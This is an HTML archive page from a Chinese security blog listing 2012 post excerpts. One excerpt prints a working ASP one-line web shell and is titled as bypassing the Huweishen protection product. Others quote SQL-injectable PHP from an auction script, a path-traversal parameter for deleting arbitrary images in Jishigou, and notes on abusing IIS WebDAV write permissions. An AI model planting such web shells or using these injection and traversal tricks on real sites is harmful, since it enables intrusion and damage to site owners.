@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Archives: 2012 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="home-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+<main class="content" role="main">
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-05-18T06:34:04.000Z" itemprop="datePublished">
+          2012-05-18
+      </time>
+    
+    
+    | 
+    <a href='/tag/一句话/'>一句话</a>,
+    
+    <a href='/tag/菜刀/'>菜刀</a>,
+    
+    <a href='/tag/护卫神/'>护卫神</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/425.seo/">突破护卫神的菜刀一句话 & 一句话变形处理</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;    <br />asp的&#160; 密码为x</p>
+      
+      </p>
+      
+      <p>
+          <a href="/425.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-05-09T17:54:24.000Z" itemprop="datePublished">
+          2012-05-10
+      </time>
+    
+    
+    | 
+    <a href='/tag/VMware/'>VMware</a>,
+    
+    <a href='/tag/虚拟机/'>虚拟机</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/422.seo/">虚拟机报错：【无法打开内核设备 .VMCIDevVMX   系统找不到指定的文件】的解决办法</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>刚在xp上安装VMWare8.0.3，新建虚拟机出现这种错误：</p>  <p>无法打开内核设备“\.\VMCIDev\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗? </p>  <p>打开模块DevicePowerOn电源失败。</p>
+      
+      </p>
+      
+      <p>
+          <a href="/422.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-05-04T07:03:33.000Z" itemprop="datePublished">
+          2012-05-04
+      </time>
+    
+    
+    | 
+    <a href='/tag/SQL-Injection/'>SQL Injection</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/419.seo/">拍客piikee竞拍网站源码全局sql injection</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>主题:拍客piikee竞拍网站源码全局sql injection   <br />作者:piaoye    <br />版权:3EST信息安全团队 (<a href="http://www.3est.com" target="_blank">www.3est.com</a>) </p>  <p>0x01 简介   <br />在乌云看以快拍拍网站充值BUG，就搜索了下这个网站，谷歌里有个类似的网站，程序注射一堆,然后就进去了。    <br />0x02 配置并编译    <br />php+mysql    <br />0x03 实战应用    <br />为什么说2B那？前台所有文件参数值都这样来的，大家看下这段代码</p>  <p>   <br />news_arc.php    <br />&lt;?php    <br />define(‘IN_JP’,true);    <br />require_once(&quot;./config/init.php&quot;); </p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $arcid = $_REQUEST[&quot;arcid&quot;];   <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; if($arcid!=&quot;&quot;){    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $qrynews2 = &quot;select <em> from news where id = &quot;.$arcid;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objnews2=$GLOBALS[‘db’]-&gt;get_one($qrynews2);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; }else{    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objnews2=&quot;&quot;;    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; } </p>  <p>&#160; $qrycount = &quot;select w.id,r.username,w.won_date,p.name,a.auc_final_price,a.auctionID,p.picture1,p.price,(100-100</em>a.auc_final_price/p.price) as discount,a.auctionID from won_auctions w left join auction a on w.auction_id=a.auctionID left join products p on a.productID=p.productID inner join registration r on w.userid = r.id where w.userid&gt;=0 order by w.won_date desc limit 0,7 &quot;;&#160; <br />&#160; $obj1 = $GLOBALS[‘db’]-&gt;select($qrycount); </p>  <p>$smarty-&gt;assign(&quot;obj1&quot;,$obj1);   <br />$smarty-&gt;assign(&quot;objnews2&quot;,$objnews2);    <br />$smarty-&gt;display(‘news_arc.htm’);    <br />?&gt;    <br /></p>
+      
+      </p>
+      
+      <p>
+          <a href="/419.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-04-23T06:33:30.000Z" itemprop="datePublished">
+          2012-04-23
+      </time>
+    
+    
+    | 
+    <a href='/tag/记事狗/'>记事狗</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/405.seo/">记事狗设计缺陷导致可以删除网站任意图片</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+         路径处理不当导致注册用户可以删除网站上的任意图片 详细说明： 注册一个用户，登录后点击上传头像，比如地址为： http://www.badguest.cn /jishigou30s/index.php?mod=settings&amp;code=face 在最后面加上&amp;temp_face=././images/noavatar.gif 再访问，然后我的头像那块就会加载这个图片，直接点击下面的“确认”，头像木有修改成功，但是no
+      
+      </p>
+      
+      <p>
+          <a href="/405.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-04-22T13:26:35.000Z" itemprop="datePublished">
+          2012-04-22
+      </time>
+    
+    
+    | 
+    <a href='/tag/IIS写权限/'>IIS写权限</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/398.seo/">IIS写权限利用续以及写权限漏洞来由解释</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>五年半前写了一篇文章：<u>《再试IIS写权限以及move为asp的问题》</u>，当时还留下一点问题，此文就是用来解决当年遗留的问题的。 <p>很多人也许觉得IIS PUT这玩意不值一提啊…其实不然，身在乙方，给客户做安服的时候总是遇到IIS写权限的问题，一方面WVS7.0已经可以扫描并且使用POC成功写入漏洞目标，另一方面无聊的土耳其或者印度尼西亚黑客总是喜欢利用写权限上传txt或者html到漏洞目标，以示对方的hack技术的强大。 <p>目前大家所见到的IIS写权限利用，其实说白了是菜鸟管理员对IIS的错误配置问题（2个错误配置造成）：<br>1.WEB服务器扩展里设置WebDAV为允许；<br>2.网站权限配置里开启了写入权限。 <p>至于WebDAV，看看百度百科的介绍： <blockquote> <p>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。</p></blockquote>
+      
+      </p>
+      
+      <p>
+          <a href="/398.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-04-20T09:02:04.000Z" itemprop="datePublished">
+          2012-04-20
+      </time>
+    
+    
+    | 
+    <a href='/tag/YY批量注册器/'>YY批量注册器</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/395.seo/">YY批量注册器 测试版</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        花了一下午的时间，写了个注册YY的程序，发布源码 VS2010开发，运行请确保已安装.net 2.0，部分功能完善中… 先发上来装个比证明我也是个小小程序猿 &nbsp;     yyregister V0.1 C#源码   主程序
+      
+      </p>
+      
+      <p>
+          <a href="/395.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <nav class="pagination" role="pagination">
+    <a class="newer-posts" href="/archives/2012/page/32/">← Newer Posts</a>
+    <span class="page-number">Page 33 of 40</span>
+    <a class="older-posts" href="/archives/2012/page/34/">Older Posts →</a>
+  </nav>
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
